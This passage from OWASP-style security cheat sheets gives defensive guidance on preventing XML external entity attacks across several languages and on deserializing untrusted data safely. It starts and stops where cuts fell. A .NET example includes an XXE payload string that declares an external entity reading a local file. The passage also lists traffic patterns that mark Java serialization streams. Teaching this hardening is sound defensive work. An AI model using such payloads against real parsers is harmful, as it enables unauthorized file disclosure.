<cfset parseroptions.ALLOWEXTERNALENTITIES = false>
<cfscript>
a = XmlParse("xml.xml", false, parseroptions);
writeDump(a);
</cfscript>
```

You can use the "parseroptions" structure shown above as an argument to secure other functions that process XML as well, such as:

```
XxmlSearch(xmldoc, xpath,parseroptions);

XmlTransform(xmldoc,xslt,parseroptions);

isXML(xmldoc,parseroptions);
```

#### Lucee

As of Lucee 5.3.4.51 and later, you can disable support for XML external entities by adding the following to your Application.cfc:

```
this.xmlFeatures = {
     externalGeneralEntities: false,
     secure: true,
     disallowDoctypeDecl: true
};
```

Support for external XML entities is disabled by default as of Lucee 5.4.2.10 and Lucee 6.0.0.514.

### Java

The examples below use the built-in Java API for XML Processing (JAXP) implementations on Java 9 or later. `newDefaultInstance()` (`newDefaultFactory()` for StAX) selects the built-in implementation instead of a provider selected through the [JAXP lookup mechanism](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/module-summary.html#LookupMechanism). For other providers, see [implementation differences](#other-providers-and-required-dtds).

These are illustrative configuration fragments. The application opens and closes the input streams, supplies trusted schemas and style sheets, and handles exceptions. **Stop processing if any required security setting fails; do not catch the exception and continue parsing.** Pass streams rather than untrusted filenames or URLs: external-entity controls do not restrict access to the initial resource passed directly to a parsing or processing API.

#### Secure configuration by API

| API | Recommended approach |
| --- | --- |
| [`DocumentBuilderFactory`](#documentbuilderfactory-dom) | Reject DOCTYPE declarations before building a document tree |
| [`SAXParserFactory` / `XMLReader`](#saxparserfactory-and-xmlreader) | Reject DOCTYPE declarations; parse through the configured reader |
| [`XMLInputFactory`](#xmlinputfactory-stax) | Disable DTD processing and external entities |
| [`TransformerFactory`](#transformerfactory-xslt) | Deny external access before compiling the style sheet |
| [`SchemaFactory` / `Validator`](#schemafactory-and-validator) | Deny external access during compilation and validation |
| [`XPath`](#xpath) | Evaluate against a document parsed with a hardened builder |
| [`Unmarshaller`](#jaxb-unmarshaller) | Supply a hardened StAX reader |

##### DocumentBuilderFactory (DOM)

For Document Object Model (DOM) parsing, [reject DOCTYPE declarations](https://xerces.apache.org/xerces2-j/features.html#disallow-doctype-decl) and leave XInclude disabled.

``` java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newDefaultInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(untrustedStream);
```

[`setExpandEntityReferences(false)`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/parsers/DocumentBuilderFactory.html#setExpandEntityReferences(boolean)) controls the representation of entity references in the tree. Do not use it as a substitute for blocking external resources.

##### SAXParserFactory and XMLReader

For Simple API for XML (SAX) parsing, reject DOCTYPE declarations on the factory before creating the reader.

``` java
SAXParserFactory spf = SAXParserFactory.newDefaultInstance();
spf.setNamespaceAware(true);
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);

XMLReader reader = spf.newSAXParser().getXMLReader();
reader.setContentHandler(handler);  // application's SAX content handler
reader.parse(new InputSource(untrustedStream));
```

##### XMLInputFactory (StAX)

For Streaming API for XML (StAX), set both [DTD and external-entity properties](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/stream/XMLInputFactory.html). DTD processing defaults to enabled; the external-entity default is unspecified.

``` java
XMLInputFactory xif = XMLInputFactory.newDefaultFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setXMLResolver((publicId, systemId, baseURI, namespace) -> {
    throw new XMLStreamException("External references are not allowed");
});
XMLStreamReader xsr = xif.createXMLStreamReader(untrustedStream);
```

Disabling DTD processing does not necessarily reject the DOCTYPE declaration. StAX does not support `FEATURE_SECURE_PROCESSING`; use the provider's processing limits when DTDs are required.

##### TransformerFactory (XSLT)

XSL Transformations (XSLT) can load resources through style sheet imports, includes and `document()`, independently of external entities. For a trusted application-owned style sheet that needs no external resources, set [both external-access restrictions](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/transform/TransformerFactory.html#setAttribute(java.lang.String,java.lang.Object)) before compilation:

``` java
TransformerFactory factory = TransformerFactory.newDefaultInstance();
factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

Transformer transformer =
        factory.newTransformer(new StreamSource(trustedStylesheetStream));
transformer.transform(new StreamSource(untrustedStream), result);
```

This configuration limits internal entity expansion but is not a sandbox for untrusted style sheets. Choose the style sheet in application code; do not trust a style sheet reference supplied by the input document. For other providers or required dependencies, apply the [resource policy](#external-resources-for-transformations-and-validation) below.

##### SchemaFactory and Validator

Schema compilation and validation can each load external resources. For a trusted application-owned schema that needs no external resources, [restrict access on the factory before compiling the schema](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/validation/SchemaFactory.html#setProperty(java.lang.String,java.lang.Object)); these restrictions also apply during validation:

``` java
SchemaFactory sf = SchemaFactory.newDefaultInstance();
sf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
sf.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
Schema schema = sf.newSchema(new StreamSource(trustedSchemaStream));

Validator validator = schema.newValidator();
validator.validate(new StreamSource(untrustedStream));
```

If you install a resolver, configure it on the factory **and each validator**: [validators do not inherit the factory's resolver](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/validation/SchemaFactory.html#setResourceResolver(org.w3c.dom.ls.LSResourceResolver)). The same applies to `ValidatorHandler`.

##### XPath

Avoid the [`InputSource` overloads of `XPath.evaluate`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/xpath/XPath.html#evaluate(java.lang.String,org.xml.sax.InputSource)), which parse the document internally. Use the [hardened DOM builder](#documentbuilderfactory-dom) and evaluate against the resulting document:

``` java
Document doc = builder.parse(untrustedStream);
XPath xpath = XPathFactory.newDefaultInstance().newXPath();
NodeList nodes = (NodeList) xpath.evaluate("//user/name", doc, XPathConstants.NODESET);
```

##### JAXB Unmarshaller

For Java Architecture for XML Binding (JAXB), pass the reader from the [StAX example](#xmlinputfactory-stax) to [`Unmarshaller.unmarshal`](https://jakarta.ee/specifications/xml-binding/4.0/apidocs/jakarta.xml.bind/jakarta/xml/bind/Unmarshaller.html#unmarshal(javax.xml.stream.XMLStreamReader)). Passing raw XML instead delegates parser configuration to the JAXB provider.

``` java
Object result = jaxbContext.createUnmarshaller().unmarshal(xsr);
```

#### Other providers and required DTDs

`newInstance()` can select a third-party provider whose settings differ. Verify the provider's documented controls and fail if a required setting is unsupported. Boolean features use `setFeature`; external-access properties use `setAttribute` on a DOM factory and `setProperty` on a SAX parser or reader.

If internal DTDs are required, install an `EntityResolver` on the DOM builder or SAX reader that throws `SAXException` for external references. Returning `null` delegates resolution to the parser. Set these [Xerces/SAX features](https://xerces.apache.org/xerces2-j/features.html#external-general-entities) to `false` instead of rejecting DOCTYPE:

- `http://xml.org/sax/features/external-general-entities`
- `http://xml.org/sax/features/external-parameter-entities`
- `http://apache.org/xml/features/nonvalidating/load-external-dtd`

Keep XInclude disabled. The last feature only controls non-validating parsing; DTD validation needs an explicit policy for any required external DTD. Set applicable `ACCESS_EXTERNAL_*` properties to `""` when supported. A resolver does not limit internal entity expansion: enable [`FEATURE_SECURE_PROCESSING`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/XMLConstants.html#FEATURE_SECURE_PROCESSING) where supported and configure the provider's processing limits. Secure processing alone is not a portable replacement for external-access restrictions.

When using a SAX resolver, call `reader.parse(...)` directly. [`SAXParser.parse(source, DefaultHandler)` replaces the reader's resolver](https://github.com/openjdk/jdk/blob/6c48f4ed707bf0b15f9b6098de30db8aae6fa40f/src/java.xml/share/classes/javax/xml/parsers/SAXParser.java#L389-L392) with the supplied handler.

#### External resources for transformations and validation

For other transformation or validation providers, supply XML, schemas and style sheets through a [`SAXSource`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/transform/sax/SAXSource.html) with a hardened, namespace-aware `XMLReader`. Separately install a rejecting `URIResolver` for transformations or `LSResourceResolver` for schemas. The input parser's settings do not control style sheet or schema dependencies.

When external dependencies are required, use a [catalog with `RESOLVE=strict`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/catalog/CatalogFeatures.html) to map approved identifiers to local resources, or an allowlisting resolver. Reject unapproved identifiers; returning `null` delegates to default resolution. External-access properties restrict protocols, not individual resources: allowing `https` is not a resource allowlist. Resources returned by your resolver remain your responsibility.

Apply the policy before compilation and during processing. Set the [`URIResolver` on the transformer factory before `newTransformer`](https://docs.oracle.com/en/java/javase/25/docs/api/java.xml/javax/xml/transform/TransformerFactory.html#setURIResolver(javax.xml.transform.URIResolver)); transformers use it by default. For validation, install the resolver on the factory and every validator as described above.

#### Parsers that wrap a JAXP parser

Supply wrappers with a hardened parser and check whether they replace its resolver:

| Library | Configuration |
| --- | --- |
| dom4j | Supply the reader with [`SAXReader.setXMLReader`](https://javadoc.io/doc/org.dom4j/dom4j/latest/org/dom4j/io/SAXReader.html#setXMLReader(org.xml.sax.XMLReader)) and set the rejecting resolver with `SAXReader.setEntityResolver`; [dom4j replaces the reader's resolver](https://github.com/dom4j/dom4j/blob/8db3742e13860c6767971867458073e8dd0fa1d1/src/main/java/org/dom4j/io/SAXReader.java#L464-L476) |
| JDOM | Supply the reader through [`SAXBuilder(XMLReaderJDOMFactory)`](https://www.jdom.org/docs/apidocs/org/jdom2/input/SAXBuilder.html#SAXBuilder-org.jdom2.input.sax.XMLReaderJDOMFactory-) |
| Commons Digester | Supply a hardened reader and call `Digester.setEntityResolver` before parsing; [Digester replaces the reader's resolver](https://github.com/apache/commons-digester/blob/0e6d183e1edba72b5d78208307c82f71bfdfb7ad/commons-digester3-core/src/main/java/org/apache/commons/digester3/Digester.java#L1869-L1876) |

#### Oracle DOM Parser

For Oracle XML Developer's Kit (`oracle.xml.parser.v2`), call [`setSecureProcessing()`](https://docs.oracle.com/en/database/oracle/oracle-database/21/adxdk/security-considerations-oracle-xml-developers-kit.html) on the DOM or SAX parser. It disables entity resolution and limits expansion. On its JAXP binding, enable `FEATURE_SECURE_PROCESSING`.

#### java.beans.XMLDecoder

Do not use `XMLDecoder` with untrusted input. Blocking external entities does not remove its [deserialization risk](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#other-deserialization-libraries-and-formats).

#### Secure JAXP factory sources

[Apache Commons Secure XML](https://commons.apache.org/proper/commons-secure-xml/) provides preconfigured factories. Check its [threat model](https://github.com/apache/commons-secure-xml/blob/main/src/site/markdown/threat_model.md) for supported runtimes and limits. Its protections do not cover URIs passed directly to parsing APIs, parsers created outside the library, or untrusted resources your resolver chooses to supply. Do not loosen its reserved security settings.

### .NET

**Up-to-date information for XXE injection in .NET is taken directly from the [web application of unit tests by Dean Fleming](https://github.com/deanf1/dotnet-security-unit-tests), which covers all currently supported .NET XML parsers, and has test cases that demonstrate when they are safe from XXE injection and when they are not, but these tests are only with injection from file and not direct DTD (used by DoS attacks).**

For DoS attacks using a direct DTD (such as the [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack)), a [separate testing application from Josh Grossman at Bounce Security](https://github.com/BounceSecurity/BillionLaughsTester) has been created to verify that .NET >=4.5.2 is safe from these attacks.

Previously, this information was based on some older articles which may not be 100% accurate including:

- [James Jardine's excellent .NET XXE article](https://www.jardinesoftware.net/2016/05/26/xxe-and-net/).
- [Guidance from Microsoft on how to prevent XXE and XML Denial of Service in .NET](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses).

#### Overview of .NET Parser Safety Levels

**Below is an overview of all supported .NET XML parsers and their default safety levels. More details about each parser are included below.**

##### XDocument (LINQ to XML) default safety levels

This parser is protected from external entities at .NET Framework version 4.5.2 and protected from Billion Laughs at version 4.5.2 or greater, but it is uncertain if this parser is protected from Billion Laughs before version 4.5.2.

##### XmlDocument, XmlTextReader, XPathNavigator default safety levels

These parsers are vulnerable to external entity attacks and Billion Laughs at versions below version 4.5.2 but protected at versions equal or greater than 4.5.2.

##### XmlDictionaryReader, XmlNodeReader, XmlReader default safety levels

These parsers are not vulnerable to external entity attacks or Billion Laughs before or after version 4.5.2. Also, at or greater than versions ≥4.5.2, these libraries won't even process the in-line DTD by default. Even if you change the default to allow processing a DTD, if a DoS attempt is performed an exception will still be thrown as documented above.

#### ASP.NET

ASP.NET applications ≥ .NET 4.5.2 must also ensure setting the `<httpRuntime targetFramework="..." />` in their `Web.config` to ≥4.5.2 or risk being vulnerable regardless of the actual .NET version. Omitting this tag will also result in unsafe-by-default behavior.

For the purpose of understanding the version thresholds above, the effective .NET Framework version for an ASP.NET application is either the .NET version the application was built with or the httpRuntime's `targetFramework` (Web.config), **whichever is lower**.

This configuration tag should not be confused with a similar configuration tag: `<compilation targetFramework="..." />` or the assemblies / projects targetFramework, which are **not** sufficient for achieving secure-by-default behavior as described above.

#### LINQ to XML

**Both the `XElement` and `XDocument` objects in the `System.Xml.Linq` library are safe from XXE injection from external file and DoS attack by default.** `XElement` parses only the elements within the XML file, so DTDs are ignored altogether. `XDocument` has XmlResolver [disabled by default](https://learn.microsoft.com/en-us/dotnet/standard/linq/linq-xml-security) so it's safe from SSRF. While DTDs are [enabled by default](https://github.com/microsoft/referencesource/blob/main/System.Xml.Linq/System/Xml/Linq/XLinq.cs#L1986-L1993), from Framework versions ≥4.5.2, it is **not** vulnerable to DoS as noted but it may be vulnerable in earlier Framework versions. For more information, see [Microsoft's guidance on how to prevent XXE and XML Denial of Service in .NET](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses)

#### XmlDictionaryReader

**`System.Xml.XmlDictionaryReader` is safe by default, as when it attempts to parse the DTD, the compiler throws an exception saying that "CData elements not valid at top level of an XML document". It becomes unsafe if constructed with a different unsafe XML parser.**

#### XmlDocument

**Prior to .NET Framework version 4.5.2, `System.Xml.XmlDocument` is unsafe by default. The `XmlDocument` object has an `XmlResolver` object within it that needs to be set to null in versions prior to 4.5.2. In versions 4.5.2 and up, this `XmlResolver` is set to null by default.**

The following example shows how it is made safe:

``` csharp
 static void LoadXML()
 {
   string xxePayload = "<!DOCTYPE doc [<!ENTITY win SYSTEM 'file:///C:/Users/testdata2.txt'>]>"
                     + "<doc>&win;</doc>";
   string xml = "<?xml version='1.0' ?>" + xxePayload;

   XmlDocument xmlDoc = new XmlDocument();
   // Setting this to NULL disables DTDs - Its NOT null by default.
   xmlDoc.XmlResolver = null;
   xmlDoc.LoadXml(xml);
   Console.WriteLine(xmlDoc.InnerText);
   Console.ReadLine();
 }
```

**For .NET Framework version ≥4.5.2, this is safe by default**.

`XmlDocument` can become unsafe if you create your own nonnull `XmlResolver` with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the [referenced MSDN article](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses).

#### XmlNodeReader

`System.Xml.XmlNodeReader` objects are safe by default and will ignore DTDs even when constructed with an unsafe parser or wrapped in another unsafe parser.

#### XmlReader

`System.Xml.XmlReader` objects are safe by default.

They are set by default to have their ProhibitDtd property set to false in .NET Framework versions 4.0 and earlier, or their `DtdProcessing` property set to Prohibit in .NET versions 4.0 and later.

Additionally, in .NET versions 4.5.2 and later, the `XmlReaderSettings` belonging to the `XmlReader` has its `XmlResolver` set to null by default, which provides an additional layer of safety.

Therefore, `XmlReader` objects will only become unsafe in version 4.5.2 and up if both the `DtdProcessing` property is set to Parse and the `XmlReaderSetting`'s `XmlResolver` is set to a nonnull XmlResolver with default or unsafe settings. If you need to enable DTD processing, instructions on how to do so safely are described in detail in the [referenced MSDN article](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/november/xml-denial-of-service-attacks-and-defenses).

#### XmlTextReader

`System.Xml.XmlTextReader` is **unsafe** by default in .NET Framework versions prior to 4.5.2. Here is how to make it safe in various .NET versions:

##### Prior to .NET 4.0

In .NET Framework versions prior to 4.0, DTD parsing behavior for `XmlReader` objects like `XmlTextReader` are controlled by the Boolean `ProhibitDtd` property found in the `System.Xml.XmlReaderSettings` and `System.Xml.XmlTextReader` classes.

Set these values to true to disable inline DTDs completely.

``` csharp
XmlTextReader reader = new XmlTextReader(stream);
// NEEDED because the default is FALSE!!
reader.ProhibitDtd = true;
```

##### .NET 4.0 - .NET 4.5.2

**In .NET Framework version 4.0, DTD parsing behavior has been changed. The `ProhibitDtd` property has been deprecated in favor of the new `DtdProcessing` property.**

**However, they didn't change the default settings so `XmlTextReader` is still vulnerable to XXE by default.**

**Setting `DtdProcessing` to `Prohibit` causes the runtime to throw an exception if a `<!DOCTYPE>` element is present in the XML.**

To set this value yourself, it looks like this:

``` csharp
XmlTextReader reader = new XmlTextReader(stream);
// NEEDED because the default is Parse!!
reader.DtdProcessing = DtdProcessing.Prohibit;
```

Alternatively, you can set the `DtdProcessing` property to `Ignore`, which will not throw an exception on encountering a `<!DOCTYPE>` element but will simply skip over it and not process it. Finally, you can set `DtdProcessing` to `Parse` if you do want to allow and process inline DTDs.

##### .NET 4.5.2 and later

In .NET Framework versions 4.5.2 and up, `XmlTextReader`'s internal `XmlResolver` is set to null by default, making the `XmlTextReader` ignore DTDs by default. The `XmlTextReader` can become unsafe if you create your own nonnull `XmlResolver` with default or unsafe settings.

#### XPathNavigator

`System.Xml.XPath.XPathNavigator` is **unsafe** by default in .NET Framework versions prior to 4.5.2.

This is due to the fact that it implements `IXPathNavigable` objects like `XmlDocument`, which are also unsafe by default in versions prior to 4.5.2.

You can make `XPathNavigator` safe by giving it a safe parser like `XmlReader` (which is safe by default) in the `XPathDocument`'s constructor.

Here is an example:

``` csharp
XmlReader reader = XmlReader.Create("example.xml");
XPathDocument doc = new XPathDocument(reader);
XPathNavigator nav = doc.CreateNavigator();
string xml = nav.InnerXml.ToString();
```

For .NET Framework version ≥4.5.2, XPathNavigator is **safe by default**.

#### XslCompiledTransform

`System.Xml.Xsl.XslCompiledTransform` (an XML transformer) is safe by default as long as the parser it's given is safe.

It is safe by default because the default parser of the `Transform()` methods is an `XmlReader`, which is safe by default (per above).

[The source code for this method is here.](https://github.com/microsoft/referencesource/blob/main/System.Xml/System/Xml/Xslt/XslCompiledTransform.cs)

Some of the `Transform()` methods accept an `XmlReader` or `IXPathNavigable` (e.g., `XmlDocument`) as an input, and if you pass in an unsafe XML Parser then the `Transform` will also be unsafe.

### iOS

#### libxml2

**iOS includes the C/C++ libxml2 library described above, so that guidance applies if you are using libxml2 directly.**

**However, the version of libxml2 provided up through iOS6 is prior to version 2.9 of libxml2 (which protects against XXE by default).**

#### NSXMLDocument

**iOS also provides an `NSXMLDocument` type, which is built on top of libxml2.**

**However, `NSXMLDocument` provides some additional protections against XXE that aren't available in libxml2 directly.**

Per the 'NSXMLDocument External Entity Restriction API' section of this [page](https://developer.apple.com/library/archive/releasenotes/Foundation/RN-Foundation-iOS/Foundation_iOS5.html):

- iOS4 and earlier: All external entities are loaded by default.
- iOS5 and later: Only entities that don't require network access are loaded. (which is safer)

**However, to completely disable XXE in an `NSXMLDocument` in any version of iOS you simply specify `NSXMLNodeLoadExternalEntitiesNever` when creating the `NSXMLDocument`.**

### PHP

With libxml 2.9.0 or later, entity substitution is disabled by default. Do not enable `LIBXML_NOENT`, `LIBXML_DTDLOAD`, or `LIBXML_DTDVALID` for untrusted XML without explicitly blocking external resources; these options can require [additional protection against external entity loading](https://www.php.net/manual/en/function.libxml-disable-entity-loader.php).

To reject external entity resolution, install a [resolver callback that returns `null`](https://www.php.net/manual/en/function.libxml-set-external-entity-loader.php) before processing untrusted XML and keep it installed for that operation:

``` php
libxml_set_external_entity_loader(function () {
    return null;
});
```

Passing `null` directly to `libxml_set_external_entity_loader()` is not equivalent to returning `null` from the callback and does not block external entity loading, as the [PHP security advisory's mitigation](https://github.com/php/php-src/security/advisories/GHSA-3qrf-m4j2-pcrr) demonstrates.

A description of how to abuse this in PHP is presented in a good [SensePost article](https://sensepost.com/blog/2014/revisting-xxe-and-abusing-protocols/) describing a cool PHP based XXE vulnerability that was fixed in Facebook.

### Python

Follow Python's current [XML security guidance](https://docs.python.org/3/library/xml.html#xml-security). The built-in parsers rely on Expat, which may be bundled with Python or supplied by the operating system. Check `pyexpat.EXPAT_VERSION` in the deployed interpreter and keep both Python and Expat updated. Expat versions below 2.7.2 may be affected by entity-expansion, large-token, or dynamic-memory denial-of-service vulnerabilities; a Python version alone does not establish the linked Expat version.

Expat itself does not access files or the network by default. Higher-level APIs and custom handlers still need an external-resource policy. Independently bound input size and decompressed data: the standard-library `xmlrpc` module is vulnerable to decompression bombs.

For untrusted XML, use the [defusedxml parsing interfaces](https://github.com/tiran/defusedxml#defusedxml) in place of the corresponding standard-library parsing functions. Keep entity and external-resource rejection enabled, and set `forbid_dtd=True` on APIs that offer it when DTDs are unnecessary. These interfaces reject prohibited constructs; they do not sanitize XML or replace application resource limits.

### Semgrep Rules

[Semgrep](https://semgrep.dev/) is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase.

#### Java

Below are the rules for different XML parsers in Java

##### DocumentBuilderFactory

Identifying XXE vulnerability in the `javax.xml.parsers.DocumentBuilderFactory` library.
The official registry rule is [documentbuilderfactory-disallow-doctype-decl-missing](https://semgrep.dev/r/java.lang.security.audit.xxe.documentbuilderfactory-disallow-doctype-decl-missing.documentbuilderfactory-disallow-doctype-decl-missing).

##### SAXParserFactory

Identifying XXE vulnerability in the `javax.xml.parsers.SAXParserFactory` library.
The official registry rule is [saxparserfactory-disallow-doctype-decl-missing](https://semgrep.dev/r/java.lang.security.audit.xxe.saxparserfactory-disallow-doctype-decl-missing.saxparserfactory-disallow-doctype-decl-missing).

##### XMLInputFactory

Identifying XXE vulnerability in the `javax.xml.stream.XMLInputFactory` library.
The official registry rule is [xmlinputfactory-possible-xxe](https://semgrep.dev/r/java.lang.security.xmlinputfactory-possible-xxe.xmlinputfactory-possible-xxe).

## Deserialization

> **Source:** [Deserialization](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This article is focused on providing clear, actionable guidance for safely deserializing untrusted data in your applications.

### What is Deserialization

**Serialization** is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them for storage, or to send as part of communications.

**Deserialization** is the reverse of that process, taking data structured in some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

However, many programming languages have native ways to serialize objects. These native formats usually offer more features than JSON or XML, including customization of the serialization process.

Unfortunately, the features of these native deserialization mechanisms can sometimes be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, or remote code execution (RCE) attacks.

### Guidance on Deserializing Objects Safely

The following language-specific guidance attempts to enumerate safe methodologies for deserializing data that can't be trusted.

#### PHP

##### Clear-box Review

Check the use of [`unserialize()`](https://www.php.net/manual/en/function.unserialize.php) function and review how the external parameters are accepted. Use a safe, standard data interchange format such as JSON (via `json_decode()` and `json_encode()`) if you need to pass serialized data to the user.

#### Python

##### Opaque-box Review

If the traffic data contains the symbol dot `.` at the end, it's very likely that the data was sent in serialization. It will be only true if the data is not being encoded using Base64 or Hexadecimal schemas. If the data is being encoded, then it's best to check if the serialization is likely happening or not by looking at the starting characters of the parameter value. For example if data is Base64 encoded, then it will most likely start with `gASV`.

##### Clear-box Review

Review the following APIs for untrusted input:

1. Uses of [`pickle.load()` or `pickle.loads()`](https://docs.python.org/3/library/pickle.html#pickle.loads). Unpickling can execute arbitrary code; never unpickle untrusted data. `pickle.loads()` expects bytes-like input, not a Python 3 string.

2. Uses of [PyYAML's unsafe loaders](https://github.com/yaml/pyyaml/blob/6.0.3/lib/yaml/__init__.py#L74-L156), such as `yaml.unsafe_load()` or `yaml.load()` with `Loader=yaml.Loader` or `Loader=yaml.UnsafeLoader`. For untrusted YAML, use [`yaml.safe_load()`](https://pyyaml.org/wiki/PyYAMLDocumentation#the-yaml-package), and do not register custom constructors that allow arbitrary object creation. Current PyYAML requires an explicit `Loader` argument for `yaml.load()`.

3. Uses of [`jsonpickle.decode()`](https://jsonpickle.readthedocs.io/en/latest/api.html#jsonpickle.decode) with untrusted input.

#### Java

For historical research on Java deserialization and defensive allowlisting, see [Java Deserialization Attacks — German OWASP Day 2016](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Deserialization_Cheat_Sheet_GOD16Deserialization.pdf).

The following techniques can reduce risks when using [Java's Serializable format](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html).

Implementation advice:

- Configure [serialization filters](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html) with an application-specific class allowlist and resource limits before reading objects.
- If maintaining a `resolveClass()` override, account for its [limitations below](#harden-your-own-javaioobjectinputstream); class checks alone do not bound resource consumption.

##### Clear-box Review

Be aware of the following Java API uses for potential serialization vulnerability.

1. `XMLdecoder` with external user defined parameters

2. `XStream` with `fromXML` method (xstream version <= v1.4.6 is vulnerable to the serialization issue)

3. `ObjectInputStream` with `readObject`

4. Uses of `readObject`, `readObjectNoData`, `readResolve` or `readExternal`

5. `ObjectInputStream.readUnshared`

6. `Serializable`

##### Opaque-box Review

If the captured traffic data includes the following patterns, it may suggest that the data was sent in Java serialization streams:

- `AC ED 00 05` in Hex
- `rO0` in Base64
- `Content-type` header of an HTTP response set to `application/x-java-serialized-object`

##### Prevent Data Leakage and Trusted Field Clobbering

If there are data members of an object that should never be controlled by end users during deserialization or exposed to users during serialization, they should be declared as [the `transient` keyword](https://docs.oracle.com/javase/7/docs/platform/serialization/spec/serial-arch.html#7231) (section *Protecting Sensitive Information*).

For a class that defined as Serializable, the sensitive information variable should be declared as `private transient`.

For example, the class `myAccount`, the variables 'profit' and 'margin' were declared as transient to prevent them from being serialized.

```java
public class myAccount implements Serializable
{
    private transient double profit; // declared transient

    private transient double margin; // declared transient
    ....
```

##### Prevent Deserialization of Domain Objects

Some of your application objects may be forced to implement `Serializable` due to their hierarchy. To guarantee that your application objects can't be deserialized, a `readObject()` method should be declared (with a `final` modifier) which always throws an exception:

```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
    throw new java.io.IOException("Cannot be deserialized");
}
```

##### Harden Your Own java.io.ObjectInputStream

The `java.io.ObjectInputStream` class is used to deserialize objects. A custom class-resolution allowlist may be useful if:

- you can change the code that does the deserialization;
- you know what classes you expect to deserialize.

The general idea is to override `ObjectInputStream.resolveClass()` to restrict ordinary class resolution during deserialization.

This does not check every object: the [serialization specification](https://docs.oracle.com/en/java/javase/17/docs/specs/serialization/input.html#the-objectinputstream-class) handles strings separately and resolves dynamic proxy class descriptors through `resolveProxyClass()`.

The following example allows only `Bicycle` through `resolveClass()`. It is an illustrative class check, not a complete deserialization defense:

```java
public class LookAheadObjectInputStream extends ObjectInputStream {

    public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
        super(inputStream);
    }

    /**
    * Restrict ordinary class resolution to our expected Bicycle class
    */
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().equals(Bicycle.class.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

Use [serialization filtering](https://docs.oracle.com/en/java/javase/17/core/serialization-filtering1.html) to combine a class allowlist with limits on graph depth, references, array lengths, and stream bytes. Also bound the serialized input size separately: filters are not called for concretely encoded strings or primitives. Filtering does not make arbitrary untrusted deserialization safe.

More complete implementations of this approach have been proposed by various community members:

- [NibbleSec](https://github.com/ikkisoft/SerialKiller) - a library that allows creating lists of classes that are allowed to be deserialized
- [IBM](https://www.ibm.com/developerworks/library/se-lookahead/) - the seminal protection, written years before the most devastating exploitation scenarios were envisioned.
- [Apache Commons IO classes](https://commons.apache.org/proper/commons-io/javadocs/api-2.5/org/apache/commons/io/serialization/ValidatingObjectInputStream.html)

##### Harden All java.io.ObjectInputStream Usage with an Agent

As mentioned above, the `java.io.ObjectInputStream` class is used to deserialize objects. It's possible to harden its behavior by subclassing it. However, if you don't own the code or can't wait for a patch, using an agent to weave in hardening to `java.io.ObjectInputStream` is the best solution.

Globally changing `ObjectInputStream` is only safe for block-listing known malicious types, because it's not possible to know for all applications what the expected classes to be deserialized are. Fortunately, there are very few classes needed in the denylist to be safe from all the known attack vectors, today.

It's inevitable that more "gadget" classes will be discovered that can be abused. However, there is an incredible amount of vulnerable software exposed today, in need of a fix. In some cases, "fixing" the vulnerability may involve re-architecting messaging systems and breaking backwards compatibility as developers move towards not accepting serialized objects.

To enable these agents, simply add a new JVM parameter:

```text
-javaagent:name-of-agent.jar
```

Agents taking this approach have been released by various community members:

- [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

A similar, but less scalable approach would be to manually patch and bootstrap your JVM's ObjectInputStream. Guidance on this approach is available [here](https://github.com/wsargent/paranoid-java-serialization).

##### Other Deserialization Libraries and Formats

While the advice above is focused on [Java's Serializable format](https://docs.oracle.com/javase/7/docs/api/java/io/Serializable.html), there are a number of other libraries
that use other formats for deserialization. Many of these libraries may have similar security
